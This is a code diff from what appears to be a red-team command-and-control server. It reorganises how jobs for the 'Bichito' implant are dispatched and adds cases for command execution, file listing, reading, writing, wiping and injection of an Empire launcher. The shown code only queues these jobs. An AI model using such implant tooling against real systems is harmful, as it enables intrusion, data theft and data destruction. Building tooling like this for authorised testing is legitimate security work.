@@ -673,15 +673,9 @@ func jobProcessor(jobO *Job){
    				setBiRidDB(chid,pid)
 				return
 				
-			// Jobs Triggered by users
-			case "exec":
-				//Lock shared Slice
-    			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-
-				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
-				return
-
+			////Jobs Triggered by users
+			//Implant Lifecycle
+			
 			case "respTime":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
@@ -698,6 +692,65 @@ func jobProcessor(jobO *Job){
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
 				return
 
+			
+			//Implant Basic Capabilities
+			case "sysinfo":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			defer jobsToProcess.mux.Unlock()
+    			
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				return
+
+			case "exec":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			defer jobsToProcess.mux.Unlock()
+
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				return
+
+			case "ls":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			defer jobsToProcess.mux.Unlock()
+
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				return
+
+			case "accesschk":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			defer jobsToProcess.mux.Unlock()
+
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				return
+
+			case "read":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			defer jobsToProcess.mux.Unlock()
+
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				return
+
+			case "write":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			defer jobsToProcess.mux.Unlock()
+
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				return
+
+			case "wipe":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			defer jobsToProcess.mux.Unlock()
+
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				return
+
+			//Staging/POST Actions
 			case "injectEmpire":
 
 				//Get staging
@@ -713,7 +766,6 @@ func jobProcessor(jobO *Job){
 					return
     			}
 
-    			//fmt.Println("Getting Launcher")
 				//Generate target shellcode
 				error,launcher := getEmpireLauncher(commandO.Staging,chid)
     			if error != "" {
@@ -729,13 +781,7 @@ func jobProcessor(jobO *Job){
     			fmt.Println("Sending Launcher")
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
 				return
-			case "sysinfo":
-				//Lock shared Slice
-    			jobsToProcess.mux.Lock()
-    			defer jobsToProcess.mux.Unlock()
-    			
-				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
-				return
+
 			default:
 				time := time.Now().Format("02/01/2006 15:04:05 MST")
 				elog := fmt.Sprintf("Job by "+cid+":Bichito(Job not implemented)")
